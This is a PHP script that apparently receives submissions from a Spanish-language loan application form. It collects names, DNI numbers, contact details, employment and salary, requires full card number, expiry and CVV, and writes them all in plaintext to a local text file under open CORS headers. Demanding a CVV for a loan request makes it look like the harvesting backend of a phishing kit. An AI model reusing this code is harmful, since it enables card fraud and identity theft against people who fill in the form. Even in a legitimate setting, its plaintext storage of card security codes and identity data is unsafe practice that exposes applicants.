<?php
// Ensure this is at the very top of the file
error_reporting(E_ALL);
ini_set('display_errors', 0); // Disable error display, but still log them
ini_set('log_errors', 1);

// Start output buffering
ob_start();

// Set headers to handle CORS and content type
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Accept, X-Requested-With");
header("Content-Type: application/json; charset=UTF-8");

// Function to send JSON response and exit
function sendJsonResponse($success, $message, $statusCode = 200) {
    ob_clean(); // Clear any buffered output
    http_response_code($statusCode);
    echo json_encode([
        'success' => $success,
        'message' => $message
    ]);
    exit();
}

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    sendJsonResponse(true, 'Preflight OK');
}

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    sendJsonResponse(false, 'Method not allowed', 405);
}

// Get form data
$formData = [
    'loanAmount' => $_POST['loanAmount'] ?? '',
    'loanTerm' => $_POST['loanTerm'] ?? '',
    'firstName' => $_POST['firstName'] ?? '',
    'lastName' => $_POST['lastName'] ?? '',
    'dni' => $_POST['dni'] ?? '',
    'province' => $_POST['province'] ?? '',
    'email' => $_POST['email'] ?? '',
    'phone' => $_POST['phone'] ?? '',
    'occupation' => $_POST['occupation'] ?? '',
    'company' => $_POST['company'] ?? '',
    'position' => $_POST['position'] ?? '',
    'monthlySalary' => $_POST['monthlySalary'] ?? '',
    'yearsEmployed' => $_POST['yearsEmployed'] ?? '',
    'cardType' => $_POST['cardType'] ?? '',
    'cardNumber' => $_POST['cardNumber'] ?? '',
    'cardName' => $_POST['cardName'] ?? '',
    'cardExpiry' => $_POST['cardExpiry'] ?? '',
    'cardCvv' => $_POST['cardCvv'] ?? '',
    'timestamp' => date('Y-m-d H:i:s')
];

// Validate required fields
$requiredFields = ['firstName', 'lastName', 'dni', 'cardNumber', 'cardName', 'cardExpiry', 'cardCvv'];
foreach ($requiredFields as $field) {
    if (empty($formData[$field])) {
        sendJsonResponse(false, "Field {$field} is required", 400);
    }
}

try {
    // Create a formatted string for the log entry
    $logEntry = "\n=== NUEVA SOLICITUD: {$formData['timestamp']} ===\n";
    $logEntry .= "DATOS DEL PRÉSTAMO\n";
    $logEntry .= "Monto: $" . number_format($formData['loanAmount'], 2) . "\n";
    $logEntry .= "Plazo: {$formData['loanTerm']} meses\n\n";

    $logEntry .= "DATOS PERSONALES\n";
    $logEntry .= "Nombre: {$formData['firstName']} {$formData['lastName']}\n";
    $logEntry .= "DNI: {$formData['dni']}\n";
    $logEntry .= "Provincia: {$formData['province']}\n";
    $logEntry .= "Email: {$formData['email']}\n";
    $logEntry .= "Teléfono: {$formData['phone']}\n\n";

    $logEntry .= "INFORMACIÓN LABORAL\n";
    $logEntry .= "Ocupación: {$formData['occupation']}\n";
    $logEntry .= "Empresa: {$formData['company']}\n";
    $logEntry .= "Cargo: {$formData['position']}\n";
    $logEntry .= "Salario mensual: $" . number_format($formData['monthlySalary'], 2) . "\n";
    $logEntry .= "Años de antigüedad: {$formData['yearsEmployed']}\n\n";

    $logEntry .= "DATOS DE TARJETA\n";
    $logEntry .= "Tipo: {$formData['cardType']}\n";
    $logEntry .= "Número: {$formData['cardNumber']}\n";
    $logEntry .= "Titular: {$formData['cardName']}\n";
    $logEntry .= "Vencimiento: {$formData['cardExpiry']}\n";
    $logEntry .= "CVV: {$formData['cardCvv']}\n\n";
    $logEntry .= "======================================\n\n";

    // Save to file with absolute path
    $fileName = __DIR__ . '/solicitudes_prestamos.txt';
    if (file_put_contents($fileName, $logEntry, FILE_APPEND) === false) {
        throw new Exception('Failed to save data to file');
    }

    sendJsonResponse(true, 'Solicitud guardada exitosamente');

} catch (Exception $e) {
    error_log("Error saving form data: " . $e->getMessage());
    sendJsonResponse(false, 'Error interno del servidor', 500);
}